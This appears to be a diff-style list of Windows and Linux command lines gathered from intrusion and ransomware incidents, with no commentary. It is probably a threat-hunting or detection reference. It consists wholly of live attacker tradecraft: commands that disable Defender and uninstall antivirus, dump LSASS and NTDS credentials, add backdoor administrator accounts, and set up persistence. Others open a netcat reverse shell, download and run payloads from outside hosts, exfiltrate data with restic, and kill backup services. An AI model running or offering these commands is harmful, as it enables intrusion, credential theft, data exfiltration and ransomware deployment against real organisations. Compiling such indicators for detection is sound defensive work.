+C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" process call create "c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer"
+wmic /node:REDACTED /user:DOMAIN\USER /password:REDACTED process call create cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp
+cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp\
+7.exe a -mx3 ad.7z ad_*
+wmic /node:"TARGET_HOST_IP" /user:"DOMAIN\USER" /password:"PASSWORD" process call create "cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\p.bat c:\windows\temp\"
+cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\k.exe c:\windows\temp\
+psexec.exe  \\TARGET_HOST_IP -u DOMAIN\USER -p "PASSWORD" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat
+rundll32.exe "C:\Users\REDACTED\AppData\Local\REDACTED\ikaqkk.dll",update /i:"TimberMule\license.dat"
+regsvr32 C:\users\public\music\kaslose64.dll
+start wmic product where name="Webroot SecureAnywhere" call uninstall /nointeractive
+start wmic product where name="Webroot SecureAnywhere" call uninstall /nointeractive
+start wmic product where name="AVG 2015" call uninstall /nointeractive
+start wmic product where name="McAfee VirusScan Enterprise" call uninstall /nointeractive
+start wmic product where name="McAfee Agent" call uninstall /nointeractive
+start wmic product where name="McAfee DLP Endpoint" call uninstall /nointeractive
+start wmic product where name="McAfee Endpoint Security Platform" call uninstall /nointeractive
+start wmic product where name="McAfee Endpoint Security Platform" call uninstall /nointeractive
+start wmic product where name="Microsoft Security Client" call uninstall /nointeractive
+start wmic product where name="Malwarebytes' Managed Client" call uninstall /nointeractive
+start wmic product where name="Sophos System Protection" call uninstall /nointeractive
+start wmic product where name="Sophos AutoUpdate" call uninstall /nointeractive
+start wmic product where name="Sophos Remote Management System" call uninstall /nointeractive
+start wmic product where name="McAfee SiteAdvisor Enterprise" call uninstall /nointeractive
+start wmic product where name="Symantec Backup Exec Remote Agent for Windows" call uninstall /nointeractive
+start wmic product where name="ESET File Security" call uninstall /nointeractive
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG\_DWORD /d 0 /f
+powershell.exe Set-MpPreference -DisableRealtimeMonitoring \$true
+powershell.exe Uninstall-WindowsFeature -Name Windows-Defender
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG\_DWORD /d 1 /f
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG\_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG\_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG\_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG\_DWORD /d "0" /f
+cmd.exe /C ping -n 1 <redacted>
+cmd.exe /C nltest /domain\_trusts&nltest /dclist:\&c:\windows\sysnative\nltest /domain\_trusts\&c:\windows\sysnative\nltest /dclist:
+cmd.exe /C nltest /domain\_trusts\&nltest /dclist:&c:\windows\sysnative\nltest /domain\_trusts\&c:\windows\sysnative\nltest /dclist:
+cmd.exe /C netstat -a -n -p tcp | find "ESTAB"
+nuclei -l sept24.txt -o sept24_op.txt -s critical,high
+nuclei -l sept24.txt -o sept24_op.txt -s medium
+nuclei -l telco_again_subfinder -o telco_again_subfinder_nuclei_scan -as
+nuclei -l rac_drdo_il_govnet -o rac_drdo_il_govnet_18-sept-23_op -s critical,high
+nuclei -l co_nic_gov -o co_nic_gov_proxy_output -s critical -proxy socks5://localhost:1080
+torify nuclei -u mossad.gov.il -o mossad.gov.il_new
+torify nuclei -u shabak.gov.il -o shabak.gov.il_new
+torify nuclei -l large_scope -o large_scope -s critical,high
+torify nuclei -l large_scope -o large_scope -as
+torify sqlmap -u https://<domain>.gov.bd/admin/manage_user.php?id=1  -v 2 --delay 1.7 --time-sec 13 --tamper space2comment --risk 3 --level 5 --random-agent  --no-cast --parse-errors --dbs
+torify ghauri -u "https://<domain>.<domain>.in/products/all-products?category=CATMAPF0CE" --dbs
+schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "schdsWin" /tr "cmd.exe /C certutil.exe -urlcache -f http://192.169.6.122:6770/svchost.exe %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe"
+schtasks /run /TN "schdsWin"
+REG QUERY HKEY\_LOCAL\_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v EnableLUA
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 powershellintelmodule.ps1
+Import-Module C:\windows\system32\powershellintelmodule.psm1
+portfwd add -R -p 89474 -l 4453 -L 192.169.6.122
+nc -e /bin/bash 104.200.67.3 1608 2> /dev/null
+rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1
+C:\Windows\system32\cmd.exe /c D:\max\eyewear.bat
+xcopy /s /i /e /h max\easygoing.dat C:\Users\[REDACTED]\AppData\Local\Temp\*
+C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
+rundll32.exe "C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 --oxoj="CategoryBeyond\license.dat"
+cmd.exe /c echo nbproc > \\.\pipe\nbproc
+cmd.exe /c echo xgxfpw > \\.\pipe\xgxfpw
+cmd.exe /c echo ylfdup > \\.\pipe\ylfdup
+powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI
+c:\windows\temp\procdump64.exe -accepteula -ma lsass.exe fwtsqmfile00.dmp
+C:\Windows\system32\cmd.exe /C dir /s *file/ Microsoft.ActiveDirectory.Management.dll
+C:\Windows\system32\cmd.exe /C where /r C:\Windows\WinSxS\ *Microsoft.ActiveDirectory.Management.dll*
+C:\Windows\system32\cmd.exe /C powershell -c "get-eventlog 'Security' | where {$_.Message -like '*<REDACTED>*' -AND 'Source Network Address'} | export-csv c:\windows\temp\events_<REDACTED>.txt"
+adfind.exe -f (objectcategory=person) > ad_users.txt
+adfind.exe -f objectcategory=computer -csv name operatingSystem > ad_computers_enum.txt
+adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
+wmic /node:<REDACTED> /user:"<REDACTED>" /password:"<REDACTED>" logicaldisk get caption,description,drivetype,providername,volumename
+C:\Windows\System32\cmd.exe /C dir \\[REDACTED HOST]\c$\users >> listing.txt
+C:\Windows\system32\cmd.exe /C locker_64.exe
+schtasks.exe /create /sc minute /mo 1 /tn "SSH Server" /rl highest /tr "C:\ProgramData\sshd\sshd.exe -f C:\ProgramData\sshd\config\sshd_config"
+schtasks.exe /create /sc minute /mo 1 /tn "SSH Key Exchange" /rl highest /tr "C:\ProgramData\sshd\ssh.exe -i C:\ProgramData\sshd\config\keys\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"
+schtasks.exe /create /sc minute /mo 1 /tn "SSH Key Exchange" /rl highest /tr C:\ProgramData\sshd\ssh.exe -i C:\ProgramData\sshd\config\keys\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15
+net user WDAGUtilityAccount2 Decryptme1488@ /add
+net localgroup Administrators WDAGUtilityAccount2 /add
+net localgroup "Remote Desktop Users" WDAGUtilityAccount2 /add
+cmd.exe /C netsh advfirewall firewall add rule dir=in name="DCOM" program=C:\Windows\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\VlPWyecW.tmp 2>&1
+cmd.exe /C netsh advfirewall firewall add rule dir=in name="DCOM" program=C:\Windows\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\pOrnerOW.tmp 2>&1
+cmd.exe /C netsh advfirewall firewall add rule dir=in name ="WMI" program=C:\Windows\system32\svchost.exe service=winmgmt action = allow protocol=TCP localport=any > C:\Windows\Temp\XsssmLZZ.tmp 2>&1
+cmd.exe /C netsh advfirewall firewall add rule dir=in name ="UnsecApp" program=C:\Windows\system32\wbem\unsecapp.exe action=allow > C:\Windows\Temp\HaALurWi.tmp 2>&1
+cmd.exe /C netsh advfirewall firewall add rule dir=out name ="WMI_OUT" program=C:\Windows\system32\svchost.exe service=winmgmt action=allow protocol=TCP localport=any > C:\Windows\Temp\WkiMfXXo.tmp 2>&1
+cmd.exe /Q /c expand cache.cab -F:* c:\programdata
+cmd.exe /Q /c start "" %%programdata%%\schcache\mswow86.exe
+cmd.exe /Q /c schtasks.exe /create /sc onlogon /tn "Wow64 Subsystem" /rl highest /tr "%%programdata%%\schcache\mswow86.exe
+cmd.exe /Q /c schtasks.exe /create /sc onlogon /tn "Wow64 Subsystem" /rl highest /tr "%%programdata%%\schcache\mswow86.exe"
+powershell.exe  "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\users\public\ntds' q q"
+powershell.exe  "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\ProgramData\ntdsutil' q q"
+cmd.exe /C net group /domain > C:\Windows\Temp\aWatKmSa.tmp 2>&1
+cmd.exe /Q /c cmdkey /list 1> \\127.0.0.1\ADMIN$\__REDACTED 2>&1
+cmd.exe /Q /c dor 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c cd programdata 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c ls 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c dir 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c expand cache.cab -F:* c:\programdata 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\____REDACTED  2>&1
+"C:\Program Files\7-Zip\7zG.exe" x -o "C:\Users\Public\netscan_portable\" -spe -an -ai#7zMap24244:76:7zEvent17814
+powershell  -w hidden -C "Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' -MaxEvents 1 | sort-object timeCreated | select-object -ExpandProperty message"
+powershell  -w hidden -C "Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' | sort-object timeCreated | select-object -ExpandProperty message"
+procdump64.exe -ma lsass.exe lsass.dmp
+schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /SC ONSTART /F
+schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat /SC ONSTART /F
+schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat /SC ONSTART /F
+schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat /sc MINUTE /mo 720 /F
+schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat /sc MINUTE /mo 720 /F
+schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /sc MINUTE /mo 720 /F
+schtasks /create /I 1 /TR C:\Users\REDACTED\AppData\Local\Notepad\UpdateEG.bat /TN UpdateEdge /SC ONIDLE
+schtasks /create /I 1 /TR C:WindowsTempUpdate.exe /TN UpdateEdge /SC ONIDLE
+cmd.exe /C reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat
+restic.exe -r rest:http://195.123.226.84:8000/ init --password-file ppp.txt
+restic.exe -r rest:http://195.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot --verbose backup "F:\Shares\<REDACTED>\<REDACTED>"
+cmd.exe /C PsExec64.exe -accepteula \\<DOMAIN-CONTROLLER-IP> -c -f -d -s up.bat
+cmd.exe /C for /f %a in (pc.txt) do copy /y \\<REDACTED>\c\$\<REDACTED>.exe \\%a\c\$\<REDACTED>.exe
+cmd.exe /C PsExec64.exe -accepteula @pc.txt -c -f -d -h 1.bat
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *a /t REG_SZ /d "cmd.exe /c C:\<REDACTED-COMPANY-NAME>.exe" /f
+reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d <REDACTED-DOMAIN-NAME>\backup2 /f
+reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG\_SZ /d JapanNight!128 /f
+schtasks.exe /Create /F /XML C:\windows\temp\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet'
+powershell.exe /c net user /add DefaultAccount P@ssw0rd123412;
+net user DefaultAccount /active:yes;
+net user DefaultAccount P@ssw0rd12341234;
+net localgroup Administrators /add DefaultAccount;
+net localgroup 'Remote Desktop Users' /add DefaultAccount;
+schtasks.exe /Create /F /XML %wintmp%\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet'
+"powershell.exe" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive  C:\windows\temp\ssasl.pmd  C:\windows\temp\ssasl.zip
+schtasks /create /tn K0adic /tr "C:\Windows\system32\mshta.exe C:\ProgramData\SZWXNUHHDP.hta" /sc onlogon /ru System /f
+procdump.exe -accepteula -ma lsass.exe mem.dmp
+PsExec.exe -d \\HOST -u "DOMAIN\USER" -p "PASSWORD" -accepteula -s cmd /c "powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"
+schtasks.exe /Create /F /TN "{97F2F70B-10D1-4447-A2F3-9B070C86E261}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Pvoeooxf).yzbbvhhdypa))) " /SC MINUTE /MO 30
+C:\redacted\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName
+C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct GET /value
+C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH  AntiSpywareProduct GET /value
+C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
+C:\Windows\system32\cmd.exe /C wmic /namespace:\\root\SecurityCenter2 PATH FirewallProduct GET /value
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v "MaxInstanceCount" /d 0xffffffff /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v "fEnableWinStation" /d 1 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSUserEnabled" /d 0 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSEnabled" /d 1 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSAppCompat" /d 0 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "IdleWinStationPoolCount" /d 1 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "TSAdvertise" /d 1 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "AllowTSConnections" /d 1 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /t REG_DWORD /v "EnableConcurrentSessions" /d 1 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v "fSingleSessionPerUser" /d 0 /f
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Oweboiqnb" /d "0"
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths\" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Oweboiqnb" /d "0"
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Oweboiqnb" /d "0"
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Oweboiqnb" /d "0"
+cmd.exe /c rmdir /S /Q "C:\Users\REDACTED\EmailStorage_REDACTED-REDACTED_REDACTED"
+"%WINDIR%\system32\NOTEPAD.EXE" C:\Decryption_INFO.txt
+"%WINDIR%\system32\cmd.exe" /c net localgroup administrators sqlbackup /add
+"%WINDIR%\system32\cmd.exe" /c net user sqlbackup Password!1221! /add
+"C:\Program Files\7-Zip\7zG.exe" x -o "C:\Users\Public\netscan_portable\" -spe -an -ai#7zMap24244:76:7zEvent17814
+"C:\Windows\System32\Wbem\WMIC.exe" logicaldisk
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command Get-Process
+C:\Windows\System32\net.exe stop "samss" /y
+C:\Windows\System32\net.exe stop "veeamcatalogsvc" /y
+C:\Windows\System32\net.exe stop "veeamcloudsvc" /y
+C:\Windows\System32\net.exe stop "veeamdeploysvc" /y
+"C:\Windows\System32\schtasks.exe" /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR "'C:\Users\pagefilerpqy.exe'" /f
+"C:\Windows\System32\schtasks.exe" /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR "'C:\Users\pagefilerpqy.exe'" /f /RL HIGHEST
+"C:\Windows\System32\schtasks.exe" /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'" /f
+"C:\Windows\System32\schtasks.exe" /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'" /f /RL HIGHEST
+C:\Windows\System32\taskkill.exe /IM sqlbrowser.exe /F
+C:\Windows\System32\taskkill.exe /IM sqlceip.exe /F
+C:\Windows\System32\taskkill.exe /IM sqlservr.exe /F
+C:\Windows\System32\taskkill.exe /IM sqlwriter.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.agent.configurationservice.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.brokerservice.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.catalogdataservice.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.cloudservice.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.externalinfrastructure.dbprovider.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.manager.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.mountservice.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.service.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.uiserver.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.backup.wmiserver.exe /F
+C:\Windows\System32\taskkill.exe /IM veeam.guest.interaction.proxy.exe /F
+C:\Windows\System32\taskkill.exe /IM veeamdeploymentsvc.exe /F
+C:\Windows\System32\taskkill.exe /IM veeamfilesysvsssvc.exe /F
+C:\Windows\System32\taskkill.exe /IM veeamnfssvc.exe /F
+C:\Windows\System32\taskkill.exe /IM veeamtransportsvc.exe /F
+"C:\Windows\system32\NOTEPAD.EXE" C:\Users\USER\Desktop\New Text Document.txt
+"C:\Windows\system32\cmd.exe" /c sc query WinDefend
+"C:\Windows\system32\cmd.exe" /c time
+"C:\Windows\system32\cmd.exe" /c tzutil /g
+"C:\Windows\system32\net.exe" accounts
+C:\Windows\system32\net1 stop "samss" /y
+C:\Windows\system32\net1 stop "veeamcatalogsvc" /y
+C:\Windows\system32\net1 stop "veeamcloudsvc" /y
+C:\Windows\system32\net1 stop "veeamdeploysvc" /y
+"C:\Windows\system32\taskmgr.exe" /4
+"C:\Windows\system32\wbem\wmiprvse.exe -Embedding"
+"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding"
+"C:\Windows\system32\whoami.exe" /all
+"C:\\Windows\\System32\\rundll32.exe\" C:/Windows/Temp//rvhz1.dll DllRegisterServer
+"cmd.exe" /c %USERPROFILE%\AppData\bigfile.exe -i -c %USERPROFILE%\AppData\1.bat
+"cmd.exe" /c DEL %USERPROFILE%\AppData\1.bat
+"cmd.exe" /c DEL %USERPROFILE%\AppData\bigfile.exe
+"cmd.exe" /c DEL %USERPROFILE%\AppData\bigfile.txt
+"cmd.exe" /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe" /f /v Debugger /t REG_SZ /d "C:\windows\system32\svchost.exe"
+"cmd.exe" /c certutil -decode %USERPROFILE%\AppData\bigfile.txt %USERPROFILE%\AppData\bigfile.exe
+icacls "C:\*" /grant Everyone:F /T /C /Q
+icacls "D:\*" /grant Everyone:F /T /C /Q
+%WINDIR%\system32\cmd.exe /C net user REDACTED /dom
+%WINDIR%\system32\cmd.exe /C net usre REDACTED /dom
+%WINDIR%\system32\cmd.exe /C nslookup
+%WINDIR%\system32\cmd.exe /C ping -n 1 <DOMAIN>
+%WINDIR%\system32\cmd.exe /C query session
+%WINDIR%\system32\cmd.exe /C wmic /node:"REDACTED" process call create "%WINDIR%\Temp\svhost.exe '143.244.146[.]183'"
+%WINDIR%\system32\cmd.exe /c net localgroup administrators sqlbackup /add
+%WINDIR%\system32\cmd.exe /c net user sqlbackup Password!1221! /add
+7z_19.exe x C:\Users\Public\archive_19.7z -so > nul
+7z_21.exe x C:\Users\Public\archive_21.7z -so > nul
+7z_34.exe x C:\Users\Public\archive_34.7z -so > nul
+7z_43.exe x C:\Users\Public\archive_43.7z -so > nul
+7z_58.exe x C:\Users\Public\archive_58.7z -so > nul
+7z_62.exe x C:\Users\Public\archive_62.7z -so > nul
+7z_68.exe x C:\Users\Public\archive_68.7z -so > nul
+7z_72.exe x C:\Users\Public\archive_72.7z -so > nul
+7z_85.exe x C:\Users\Public\archive_85.7z -so > nul
+7z_89.exe x C:\Users\Public\archive_89.7z -so > nul
+7z_91.exe x C:\Users\Public\archive_91.7z -so > nul
+7z_96.exe x C:\Users\Public\archive_96.7z -so > nul
+<num>.exe -access-token <token> -v -p .
+C:\Windows\system32\cmd.exe /C shell whoami /all
+C:\WINDOWS\SYSTEM32\NET1  GROUP "DOMAIN ADMINS" NONAME /DOMAIN /ADD
+C:\WINDOWS\SYSTEM32\NET1  GROUP "ENTERPRISE ADMINS" NONAME /DOMAIN /ADD
+C:\WINDOWS\SYSTEM32\NET1  USER NONAME SLEPOY_123 /DOMAIN /ADD
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @"C:\Users\<REDACTED>\AppData\Local\Temp\npfdesjp\npfdesjp.cmdline"
+C:\Windows\system32\\cmd.exe /C systeminfo
+C:\Windows\system32\bitsadmin.exe /transfer debjob /download /priority normal \DOMIANCONTROLLER\c\$\windows\DOMAINNAME.exe C:\Windows\DOMAINNAME.exe
+C:\Windows\system32\bitsadmin.exe /transfer debjob /download /priority normal \\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe C:\Windows\DOMAINNAME.exe
+C:\Windows\system32\cmd.exe /C WMIC/node:"DC.DOMAIN.local" process call create "cmd /c C:\PerfLogs\servisess.exe\"
+C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=group)" > ad_group.txt
+C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt
+C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=person)" > ad_users.txt
+C:\Windows\system32\cmd.exe /C adfind.exe -f "objectcategory=computer" > ad_computers.txt
+C:\Windows\system32\cmd.exe /C adfind.exe -gcb -sc trustdmp > trustdmp.txt
+C:\Windows\system32\cmd.exe /C adfind.exe -sc trustdmp > trustdmp.txt
+C:\Windows\system32\cmd.exe /C adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt
+C:\Windows\system32\cmd.exe /C cmd /c vssadmin create shadow /for=C: 2>&1
+C:\Windows\system32\cmd.exe /C dir \\Server\c$
+C:\Windows\system32\cmd.exe /C ipconfig /all
+C:\Windows\system32\cmd.exe /C net group "Domain Computers" /domain
+C:\Windows\system32\cmd.exe /C net group /domain "Domain Admins"
+C:\Windows\system32\cmd.exe /C net group /domain "Enterprise Admins"
+C:\Windows\system32\cmd.exe /C net users
+C:\Windows\system32\cmd.exe /C nltest /dclist:"DOMAINNAME"
+C:\Windows\system32\cmd.exe /C rundll32 C:\Windows\system32\SQL.dll, StartW
+C:\Windows\system32\cmd.exe /C vssadmin create shadow
+C:\Windows\system32\cmd.exe /C vssadmin create shadow /for=C: 2>&1
+C:\Windows\system32\cmd.exe /C vssadmin list shadows
+C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" process call create "c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer
+C:\Windows\system32\cmd.exe /K copy ttsel.exe \\<IP>\c$\windows\temp\
+C:\Windows\system32\cmd.exe /c C:\Perflogs\434.bat
+C:\Windows\system32\cmd.exe /c echo 92d8cc45954 > \\.\pipe\446b3c
+C:\Windows\system32\cmd.exe /c echo 92d8cc45954 >; \\.\pipe\446b3c
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Oweboiqnb" /d "0"
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Oweboiqnb" /d "0"
+C:\Windows\system32\schtasks.exe /run /tn MicrosoftEdgeUpdateTaskMachineUC
+C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
+C:\Windows\system32\taskmgr.exe /4
+C:\\Windows\\System32\\wbem\\wmic.exe  /node:REDACTED process call create "cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))"
+C:\\Windows\\system32\\cmd.exe /c C:\\Users\\USER~1\\AppData\\Local\\Temp\\J10B9.cmd > C:\\Users\\USER~1\\AppData\\Local\\Temp\\yp710BA.tmp 2> C:\\Users\\USER~1\\AppData\\Local\\Temp\\1N10CB.tmp
+C:\\Windows\\system32\\net.exe group "domain admins" /domain
+C:\\Windows\\system32\\schtasks.exe /run /tn "Zvhlxdonjwfvei"
+C:\\Windows\\system32\\whoami.exe  /user
+C:\\Windows\\system32\\whoami.exe /groups
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "microsoft update" /t REG_SZ /F /D "SCHTASKS /run /tn 9T6ukfi6"
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
